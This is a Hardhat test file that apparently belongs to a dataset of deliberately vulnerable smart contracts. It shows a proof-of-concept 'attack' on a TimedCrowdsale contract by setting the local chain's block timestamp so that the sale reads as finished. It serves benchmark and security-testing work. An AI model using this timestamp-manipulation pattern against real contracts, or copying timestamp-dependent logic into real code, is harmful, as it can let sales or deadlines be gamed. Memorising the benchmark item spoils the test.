const { loadFixture, time, mine } = require('@nomicfoundation/hardhat-network-helpers');
const { expect } = require('chai');

describe('attack time_manipulation/timed_crowdsale.sol', function () {
    async function deployContracts() {
        const TimedCrowdsale = await ethers.getContractFactory('contracts/dataset/time_manipulation/timed_crowdsale.sol:TimedCrowdsale');
        const victim = await TimedCrowdsale.deploy();

    return {victim};
    }

  
    it('exploit time manipulation vulnerability', async function () {
        const {victim} = await loadFixture(deployContracts);

        const saleEndTimestamp = 1546300800;

        // // Fast forward time to January 1, 2019 (just after sale end)
        await time.setNextBlockTimestamp(saleEndTimestamp);
        await mine(1);

        // // The sale should now be finished due to the time manipulation
        const saleFinished = await victim.isSaleFinished();
        expect(saleFinished).to.be.true;
    });
  });